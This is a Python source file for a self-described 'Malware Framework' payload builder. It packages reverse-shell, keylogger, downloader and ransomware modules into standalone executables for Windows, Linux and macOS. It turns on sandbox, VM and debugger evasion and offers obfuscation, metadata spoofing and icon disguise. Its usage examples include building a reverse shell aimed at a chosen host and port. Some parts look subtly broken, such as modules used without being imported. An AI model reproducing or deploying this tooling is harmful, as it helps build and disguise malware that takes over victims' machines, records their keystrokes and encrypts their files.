#!/usr/bin/env python3
"""
Payload Builder for Malware Framework
Builds and packages payloads for deployment
"""

import os
import sys
import argparse
import subprocess
import shutil
import tempfile
from pathlib import Path
from typing import Dict, Any, List, Optional
import json
import yaml
import logging

logger = logging.getLogger(__name__)

class PayloadBuilder:
    """Payload builder for malware framework"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize payload builder"""
        self.config = config
        self.build_dir = Path("build")
        self.build_dir.mkdir(exist_ok=True)
        
        # Builder options
        self.obfuscate = config.get('obfuscate', False)
        self.encrypt_strings = config.get('encrypt_strings', False)
        self.add_icon = config.get('add_icon', False)
        self.spoof_metadata = config.get('spoof_metadata', False)
        self.anti_analysis = config.get('anti_analysis', False)
        
        # Available build targets
        self.build_targets = {
            'windows': {
                'extensions': ['.exe', '.dll', '.bat', '.ps1'],
                'pyinstaller': True,
                'nuitka': True,
                'auto_py_to_exe': True
            },
            'linux': {
                'extensions': ['.elf', '.so', '.sh'],
                'pyinstaller': True,
                'nuitka': True,
                'cx_freeze': True
            },
            'macos': {
                'extensions': ['.app', '.dylib', '.sh'],
                'pyinstaller': True,
                'nuitka': True,
                'py2app': True
            }
        }
    
    def build_payload(self, 
                     module_name: str,
                     target_platform: str = 'auto',
                     output_format: str = 'auto',
                     output_name: Optional[str] = None,
                     **kwargs) -> Optional[Path]:
        """Build a payload"""
        try:
            # Determine target platform
            if target_platform == 'auto':
                target_platform = self._detect_platform()
            
            # Validate platform
            if target_platform not in self.build_targets:
                logger.error(f"Unsupported platform: {target_platform}")
                return None
            
            # Create payload configuration
            payload_config = self._create_payload_config(module_name, **kwargs)
            
            # Generate payload script
            payload_script = self._generate_payload_script(module_name, payload_config)
            
            # Build payload
            output_path = self._build_executable(
                payload_script,
                target_platform,
                output_format,
                output_name
            )
            
            if output_path:
                logger.info(f"Payload built successfully: {output_path}")
                return output_path
            else:
                logger.error("Failed to build payload")
                return None
        
        except Exception as e:
            logger.error(f"Payload build failed: {e}")
            return None
    
    def _detect_platform(self) -> str:
        """Detect current platform"""
        import platform
        system = platform.system().lower()
        
        if system == 'windows':
            return 'windows'
        elif system == 'linux':
            return 'linux'
        elif system == 'darwin':
            return 'macos'
        else:
            return 'linux'  # Default to Linux
    
    def _create_payload_config(self, module_name: str, **kwargs) -> Dict[str, Any]:
        """Create payload configuration"""
        config = {
            'module': module_name,
            'version': '1.0.0',
            'timestamp': int(time.time()),
            'stealth': {
                'enabled': True,
                'sandbox_detection': True,
                'debugger_detection': True,
                'vm_detection': True
            },
            'encryption': {
                'enabled': True,
                'algorithm': 'aes'
            }
        }
        
        # Add module-specific configuration
        if module_name == 'reverse_shell':
            config.update({
                'host': kwargs.get('host', '127.0.0.1'),
                'port': kwargs.get('port', 4444),
                'protocol': kwargs.get('protocol', 'tcp'),
                'shell_type': kwargs.get('shell_type', 'auto')
            })
        
        elif module_name == 'keylogger':
            config.update({
                'log_file': kwargs.get('log_file', 'keylog.txt'),
                'dump_interval': kwargs.get('dump_interval', 60),
                'encrypt_logs': kwargs.get('encrypt_logs', True)
            })
        
        elif module_name == 'downloader':
            config.update({
                'urls': kwargs.get('urls', []),
                'output_dir': kwargs.get('output_dir', 'downloads'),
                'proxy': kwargs.get('proxy', None)
            })
        
        elif module_name == 'ransomware':
            config.update({
                'target_directories': kwargs.get('target_directories', []),
                'target_extensions': kwargs.get('target_extensions', []),
                'simulation_mode': kwargs.get('simulation_mode', True)
            })
        
        # Update with any additional kwargs
        config.update(kwargs)
        
        return config
    
    def _generate_payload_script(self, module_name: str, config: Dict[str, Any]) -> Path:
        """Generate payload script"""
        try:
            # Create temporary directory
            temp_dir = Path(tempfile.mkdtemp())
            
            # Generate main script
            main_script = temp_dir / "payload.py"
            
            with open(main_script, 'w') as f:
                f.write(self._generate_main_script(module_name, config))
            
            # Generate requirements
            requirements_file = temp_dir / "requirements.txt"
            with open(requirements_file, 'w') as f:
                f.write(self._generate_requirements(module_name))
            
            # Copy framework modules
            self._copy_framework_modules(temp_dir)
            
            return main_script
        
        except Exception as e:
            logger.error(f"Failed to generate payload script: {e}")
            raise
    
    def _generate_main_script(self, module_name: str, config: Dict[str, Any]) -> str:
        """Generate main payload script"""
        script = f'''#!/usr/bin/env python3
"""
Generated Payload Script
Module: {module_name}
Timestamp: {config.get('timestamp', 'unknown')}
"""

import sys
import os
from pathlib import Path

# Add framework modules to path
script_dir = Path(__file__).parent
sys.path.insert(0, str(script_dir))

# Import framework components
from core.base_payload import BasePayload
from core.encryption import EncryptionManager
from core.stealth import StealthManager
from core.utils import SystemUtils

# Import target module
from modules.{module_name} import {module_name.title().replace('_', '')}

def main():
    """Main payload entry point"""
    try:
        # Configuration
        config = {config}
        
        # Create and run payload
        payload_class = {module_name.title().replace('_', '')}
        payload = payload_class(config)
        
        # Start payload
        if payload.start():
            print("Payload started successfully")
            
            # Keep running
            try:
                while payload.running:
                    import time
                    time.sleep(1)
            except KeyboardInterrupt:
                print("Payload interrupted")
        else:
            print("Failed to start payload")
    
    except Exception as e:
        print(f"Payload error: {{e}}")

if __name__ == "__main__":
    main()
'''
        return script
    
    def _generate_requirements(self, module_name: str) -> str:
        """Generate requirements.txt for payload"""
        base_requirements = [
            'cryptography>=3.4.8',
            'psutil>=5.8.0',
            'requests>=2.25.1'
        ]
        
        # Add module-specific requirements
        if module_name == 'keylogger':
            if SystemUtils.is_windows():
                base_requirements.append('pywin32>=228')
            else:
                base_requirements.append('pynput>=1.7.6')
        
        elif module_name == 'downloader':
            base_requirements.extend([
                'urllib3>=1.26.0',
                'certifi>=2020.12.5'
            ])
        
        return '\n'.join(base_requirements)
    
    def _copy_framework_modules(self, target_dir: Path) -> None:
        """Copy framework modules to target directory"""
        try:
            # Create modules directory
            modules_dir = target_dir / "modules"
            modules_dir.mkdir(exist_ok=True)
            
            # Copy core modules
            core_dir = target_dir / "core"
            core_dir.mkdir(exist_ok=True)
            
            core_files = [
                "core/base_payload.py",
                "core/encryption.py",
                "core/stealth.py",
                "core/utils.py"
            ]
            
            for file_path in core_files:
                src = Path(file_path)
                if src.exists():
                    dst = target_dir / file_path
                    dst.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(src, dst)
            
            # Copy target module
            module_file = f"modules/{self.config.get('module', 'reverse_shell')}.py"
            src = Path(module_file)
            if src.exists():
                dst = modules_dir / src.name
                shutil.copy2(src, dst)
            
            # Create __init__.py files
            (core_dir / "__init__.py").touch()
            (modules_dir / "__init__.py").touch()
        
        except Exception as e:
            logger.error(f"Failed to copy framework modules: {e}")
            raise
    
    def _build_executable(self, 
                         script_path: Path,
                         platform: str,
                         format: str,
                         output_name: Optional[str]) -> Optional[Path]:
        """Build executable from script"""
        try:
            if format == 'auto':
                format = 'pyinstaller'  # Default to PyInstaller
            
            if format == 'pyinstaller':
                return self._build_with_pyinstaller(script_path, platform, output_name)
            elif format == 'nuitka':
                return self._build_with_nuitka(script_path, platform, output_name)
            elif format == 'auto_py_to_exe':
                return self._build_with_auto_py_to_exe(script_path, platform, output_name)
            else:
                logger.error(f"Unsupported build format: {format}")
                return None
        
        except Exception as e:
            logger.error(f"Build failed: {e}")
            return None
    
    def _build_with_pyinstaller(self, 
                               script_path: Path,
                               platform: str,
                               output_name: Optional[str]) -> Optional[Path]:
        """Build with PyInstaller"""
        try:
            # Determine output name
            if not output_name:
                output_name = f"payload_{int(time.time())}"
            
            # Add platform extension
            if platform == 'windows':
                output_name += '.exe'
            elif platform == 'linux':
                output_name += '.elf'
            elif platform == 'macos':
                output_name += '.app'
            
            # Build PyInstaller command
            cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--distpath', str(self.build_dir),
                '--workpath', str(self.build_dir / 'temp'),
                '--name', output_name,
                str(script_path)
            ]
            
            # Add obfuscation options
            if self.obfuscate:
                cmd.extend(['--key', 'MALWARE_FRAMEWORK_KEY'])
            
            # Add icon if specified
            if self.add_icon:
                icon_path = self.config.get('icon_path')
                if icon_path and Path(icon_path).exists():
                    cmd.extend(['--icon', icon_path])
            
            # Run PyInstaller
            logger.info(f"Running PyInstaller: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                output_path = self.build_dir / output_name
                if output_path.exists():
                    return output_path
                else:
                    logger.error("PyInstaller completed but output file not found")
                    return None
            else:
                logger.error(f"PyInstaller failed: {result.stderr}")
                return None
        
        except Exception as e:
            logger.error(f"PyInstaller build failed: {e}")
            return None
    
    def _build_with_nuitka(self,
                          script_path: Path,
                          platform: str,
                          output_name: Optional[str]) -> Optional[Path]:
        """Build with Nuitka"""
        try:
            # Determine output name
            if not output_name:
                output_name = f"payload_{int(time.time())}"
            
            # Add platform extension
            if platform == 'windows':
                output_name += '.exe'
            elif platform == 'linux':
                output_name += '.elf'
            elif platform == 'macos':
                output_name += '.app'
            
            # Build Nuitka command
            cmd = [
                'python', '-m', 'nuitka',
                '--onefile',
                '--remove-output',
                '--output-dir', str(self.build_dir),
                '--output-filename', output_name,
                str(script_path)
            ]
            
            # Run Nuitka
            logger.info(f"Running Nuitka: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                output_path = self.build_dir / output_name
                if output_path.exists():
                    return output_path
                else:
                    logger.error("Nuitka completed but output file not found")
                    return None
            else:
                logger.error(f"Nuitka failed: {result.stderr}")
                return None
        
        except Exception as e:
            logger.error(f"Nuitka build failed: {e}")
            return None
    
    def _build_with_auto_py_to_exe(self,
                                  script_path: Path,
                                  platform: str,
                                  output_name: Optional[str]) -> Optional[Path]:
        """Build with auto-py-to-exe"""
        try:
            # This would require GUI interaction, so we'll just show instructions
            logger.info("auto-py-to-exe requires GUI interaction")
            logger.info(f"Script to convert: {script_path}")
            logger.info(f"Target platform: {platform}")
            logger.info(f"Output name: {output_name}")
            
            return None
        
        except Exception as e:
            logger.error(f"auto-py-to-exe build failed: {e}")
            return None
    
    def list_modules(self) -> None:
        """List available modules"""
        print("\n=== Available Modules ===")
        modules = [
            ('reverse_shell', 'TCP/HTTP reverse shell'),
            ('keylogger', 'Stealth keylogger'),
            ('downloader', 'File downloader'),
            ('ransomware', 'Ransomware simulator')
        ]
        
        for name, description in modules:
            print(f"  {name}: {description}")
        print()
    
    def list_platforms(self) -> None:
        """List supported platforms"""
        print("\n=== Supported Platforms ===")
        for platform, info in self.build_targets.items():
            extensions = ', '.join(info['extensions'])
            print(f"  {platform}: {extensions}")
        print()
    
    def list_formats(self) -> None:
        """List supported build formats"""
        print("\n=== Supported Build Formats ===")
        formats = [
            ('pyinstaller', 'PyInstaller (recommended)'),
            ('nuitka', 'Nuitka (faster, smaller)'),
            ('auto_py_to_exe', 'auto-py-to-exe (GUI)')
        ]
        
        for name, description in formats:
            print(f"  {name}: {description}")
        print()

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Malware Framework Payload Builder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python builder.py --list-modules
  python builder.py --module reverse_shell --host 192.168.1.100 --port 4444
  python builder.py --module keylogger --platform windows --format pyinstaller
  python builder.py --module downloader --urls http://example.com/file.txt
        """
    )
    
    parser.add_argument(
        '--module', '-m',
        required=True,
        help='Module to build'
    )
    
    parser.add_argument(
        '--platform', '-p',
        default='auto',
        choices=['auto', 'windows', 'linux', 'macos'],
        help='Target platform'
    )
    
    parser.add_argument(
        '--format', '-f',
        default='auto',
        choices=['auto', 'pyinstaller', 'nuitka', 'auto_py_to_exe'],
        help='Build format'
    )
    
    parser.add_argument(
        '--output', '-o',
        help='Output filename'
    )
    
    parser.add_argument(
        '--list-modules',
        action='store_true',
        help='List available modules'
    )
    
    parser.add_argument(
        '--list-platforms',
        action='store_true',
        help='List supported platforms'
    )
    
    parser.add_argument(
        '--list-formats',
        action='store_true',
        help='List supported build formats'
    )
    
    parser.add_argument(
        '--obfuscate',
        action='store_true',
        help='Obfuscate the payload'
    )
    
    parser.add_argument(
        '--encrypt-strings',
        action='store_true',
        help='Encrypt string literals'
    )
    
    parser.add_argument(
        '--add-icon',
        action='store_true',
        help='Add custom icon'
    )
    
    parser.add_argument(
        '--spoof-metadata',
        action='store_true',
        help='Spoof file metadata'
    )
    
    parser.add_argument(
        '--anti-analysis',
        action='store_true',
        help='Add anti-analysis features'
    )
    
    # Module-specific arguments
    parser.add_argument('--host', help='Target host (reverse shell)')
    parser.add_argument('--port', type=int, help='Target port (reverse shell)')
    parser.add_argument('--protocol', help='Protocol (reverse shell)')
    parser.add_argument('--urls', nargs='+', help='URLs to download')
    parser.add_argument('--output-dir', help='Output directory (downloader)')
    parser.add_argument('--target-dirs', nargs='+', help='Target directories (ransomware)')
    parser.add_argument('--simulation', action='store_true', help='Simulation mode (ransomware)')
    
    args = parser.parse_args()
    
    # Handle list commands
    if args.list_modules:
        builder = PayloadBuilder({})
        builder.list_modules()
        return
    
    if args.list_platforms:
        builder = PayloadBuilder({})
        builder.list_platforms()
        return
    
    if args.list_formats:
        builder = PayloadBuilder({})
        builder.list_formats()
        return
    
    # Build configuration
    config = {
        'module': args.module,
        'obfuscate': args.obfuscate,
        'encrypt_strings': args.encrypt_strings,
        'add_icon': args.add_icon,
        'spoof_metadata': args.spoof_metadata,
        'anti_analysis': args.anti_analysis
    }
    
    # Add module-specific arguments
    if args.host:
        config['host'] = args.host
    if args.port:
        config['port'] = args.port
    if args.protocol:
        config['protocol'] = args.protocol
    if args.urls:
        config['urls'] = args.urls
    if args.output_dir:
        config['output_dir'] = args.output_dir
    if args.target_dirs:
        config['target_directories'] = args.target_dirs
    if args.simulation:
        config['simulation_mode'] = True
    
    # Build payload
    builder = PayloadBuilder(config)
    
    try:
        output_path = builder.build_payload(
            module_name=args.module,
            target_platform=args.platform,
            output_format=args.format,
            output_name=args.output,
            **config
        )
        
        if output_path:
            print(f"Payload built successfully: {output_path}")
        else:
            print("Failed to build payload")
            sys.exit(1)
    
    except Exception as e:
        logger.error(f"Build failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    import time
    main() 